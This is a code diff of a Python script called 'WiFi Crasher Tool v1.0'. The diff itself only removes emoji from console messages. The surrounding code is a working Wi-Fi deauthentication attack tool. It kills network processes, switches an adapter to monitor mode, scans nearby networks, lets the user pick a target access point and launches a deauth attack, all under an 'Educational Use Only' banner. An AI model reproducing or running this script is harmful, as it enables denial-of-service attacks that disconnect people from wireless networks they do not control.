@@ -40,10 +40,10 @@ def print_banner():
     
     border = f"{Colors.CYAN}{Colors.BOLD}{'═' * 60}{Colors.RESET}"
     
-    title = f"{Colors.MAGENTA}{Colors.BOLD}📡 WiFi Crasher Tool v1.0{Colors.RESET}"
+    title = f"{Colors.MAGENTA}{Colors.BOLD} WiFi Crasher Tool v1.0{Colors.RESET}"
     warning = f"{Colors.YELLOW}Educational Use Only{Colors.RESET}"
-    telegram = f"{Colors.GREEN}🔗 Telegram:{Colors.WHITE} https://t.me/A_t_o_m_ic{Colors.RESET}"
-    github = f"{Colors.GREEN}🐙 GitHub:{Colors.WHITE} https://github.com/squidward404{Colors.RESET}"
+    telegram = f"{Colors.GREEN} Telegram:{Colors.WHITE} https://t.me/A_t_o_m_ic{Colors.RESET}"
+    github = f"{Colors.GREEN} GitHub:{Colors.WHITE} https://github.com/squidward404{Colors.RESET}"
     
     print(ascii_art)
     print(f"{Colors.CYAN}{Colors.BOLD}")
@@ -70,7 +70,7 @@ print_banner()
 
 if not os.environ.get('SUDO_UID'):
     print_color("❌ Error: This script must be run with sudo!", Colors.RED)
-    print_color("💡 Try: sudo python3 " + os.path.basename(__file__), Colors.YELLOW)
+    print_color(" Try: sudo python3 " + os.path.basename(__file__), Colors.YELLOW)
     exit(1)
 
 for file_name in os.listdir():
@@ -103,19 +103,19 @@ def detect_interfaces():
         pass
     return list(dict.fromkeys(interfaces))
 
-print_color("🔍 Scanning for wireless interfaces...", Colors.CYAN)
+print_color(" Scanning for wireless interfaces...", Colors.CYAN)
 check_wifi_result = detect_interfaces()
 
 if not check_wifi_result:
     print_color("\n❌ No WiFi adapters detected!", Colors.RED)
-    print_color("\n💡 Troubleshooting tips:", Colors.YELLOW)
+    print_color("\n   Troubleshooting tips:", Colors.YELLOW)
     print_color("  1. Ensure your WiFi adapter supports monitor mode", Colors.WHITE)
     print_color("  2. Run: sudo rfkill unblock wifi", Colors.WHITE)
     print_color("  3. Install required tools: sudo apt install aircrack-ng wireless-tools iw", Colors.WHITE)
     print_color("  4. Try an external adapter (e.g., Alfa AWUS036NHA)", Colors.WHITE)
     exit(1)
 
-print_color(f"\n✅ Found {len(check_wifi_result)} wireless interface(s):", Colors.GREEN)
+print_color(f"\n Found {len(check_wifi_result)} wireless interface(s):", Colors.GREEN)
 for index, item in enumerate(check_wifi_result):
     print_color(f"   {Colors.BOLD}[{index}]{Colors.RESET} {Colors.CYAN}{item}{Colors.RESET}", Colors.WHITE)
 
@@ -125,28 +125,28 @@ while True:
         idx = int(choice)
         if 0 <= idx < len(check_wifi_result):
             hacknic = check_wifi_result[idx]
-            print_color(f"\n🎯 Selected: {Colors.BOLD}{hacknic}{Colors.RESET}", Colors.GREEN)
+            print_color(f"\n Selected: {Colors.BOLD}{hacknic}{Colors.RESET}", Colors.GREEN)
             break
         else:
             print_color("❌ Index out of range. Try again.", Colors.RED)
     except ValueError:
         print_color("❌ Please enter a valid number.", Colors.RED)
 
-print_color("\n🔧 Killing conflicting processes...", Colors.CYAN)
+print_color("\n Killing conflicting processes...", Colors.CYAN)
 subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-print_color(f"\n📡 Putting {hacknic} into monitor mode...", Colors.CYAN)
+print_color(f"\n Putting {hacknic} into monitor mode...", Colors.CYAN)
 try:
     subprocess.run(["ip", "link", "set", hacknic, "down"], check=True, capture_output=True)
     subprocess.run(["iw", hacknic, "set", "monitor", "none"], check=True, capture_output=True)
     subprocess.run(["ip", "link", "set", hacknic, "up"], check=True, capture_output=True)
-    print_color("✅ Monitor mode enabled successfully!", Colors.GREEN)
+    print_color(" Monitor mode enabled successfully!", Colors.GREEN)
 except subprocess.CalledProcessError as e:
     print_color(f"❌ Failed to enable monitor mode: {e}", Colors.RED)
-    print_color("💡 Your adapter/driver may not support monitor mode.", Colors.YELLOW)
+    print_color(" Your adapter/driver may not support monitor mode.", Colors.YELLOW)
     exit(1)
 
-print_color(f"\n🔎 Starting scan on {hacknic}... (Press Ctrl+C when ready to attack)", Colors.CYAN)
+print_color(f"\n Starting scan on {hacknic}... (Press Ctrl+C when ready to attack)", Colors.CYAN)
 scan_process = subprocess.Popen(
     ["airodump-ng", "-w", "scan", "--write-interval", "1", "--output-format", "csv", hacknic],
     stdout=subprocess.DEVNULL, 
@@ -180,7 +180,7 @@ try:
         print_color("─" * 60, Colors.BLUE)
         
         if not active_wireless_networks:
-            print_color("⏳ Scanning... waiting for networks to appear", Colors.YELLOW)
+            print_color(" Scanning... waiting for networks to appear", Colors.YELLOW)
         else:
             for idx, net in enumerate(active_wireless_networks):
                 bssid = net.get('BSSID', 'N/A')
@@ -199,11 +199,11 @@ try:
                     color = Colors.WHITE
                 print(f"{Colors.BOLD}{idx:<4}{Colors.RESET} {bssid:<18} {channel:<4} {color}{essid}{Colors.RESET}")
         
-        print_color(f"\n{Colors.YELLOW}📡 Scanning... Press Ctrl+C to select a target{Colors.RESET}")
+        print_color(f"\n{Colors.YELLOW} Scanning... Press Ctrl+C to select a target{Colors.RESET}")
         time.sleep(1)
 
 except KeyboardInterrupt:
-    print_color("\n\n⏹️  Scan stopped. Ready to select target.", Colors.CYAN)
+    print_color("\n\n  Scan stopped. Ready to select target.", Colors.CYAN)
     scan_process.terminate()
     scan_process.wait()
 
@@ -226,15 +226,15 @@ hackbssid = target["BSSID"]
 hackchannel = target["channel"].strip()
 hackessid = target.get("ESSID", "<hidden>").strip() or "<hidden>"
 
-print_color(f"\n🎯 Target selected:", Colors.GREEN)
+print_color(f"\n Target selected:", Colors.GREEN)
 print_color(f"   ESSID: {Colors.BOLD}{hackessid}{Colors.RESET}", Colors.WHITE)
 print_color(f"   BSSID: {Colors.BOLD}{hackbssid}{Colors.RESET}", Colors.WHITE)
 print_color(f"   Channel: {Colors.BOLD}{hackchannel}{Colors.RESET}", Colors.WHITE)
 
-print_color(f"\n🔒 Locking to channel {hackchannel}...", Colors.CYAN)
+print_color(f"\n Locking to channel {hackchannel}...", Colors.CYAN)
 subprocess.run(["airmon-ng", "start", hacknic, hackchannel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-print_color(f"\n⚡ Starting deauth attack on {hackessid}...", Colors.RED + Colors.BOLD)
+print_color(f"\n Starting deauth attack on {hackessid}...", Colors.RED + Colors.BOLD)
 print_color(f"   Target: {hackbssid} | Interface: {hacknic}", Colors.WHITE)
 print_color(f"   {Colors.YELLOW}Press Ctrl+C to stop the attack{Colors.RESET}\n")
 
@@ -246,6 +246,6 @@ try:
         hacknic
     ])
 except KeyboardInterrupt:
-    print_color("\n\n✅ Attack stopped by user.", Colors.GREEN)
+    print_color("\n\n Attack stopped by user.", Colors.GREEN)
 
-print_color("\n🏁 Script completed.", Colors.CYAN + Colors.BOLD)
+print_color("\n Script completed.", Colors.CYAN + Colors.BOLD)
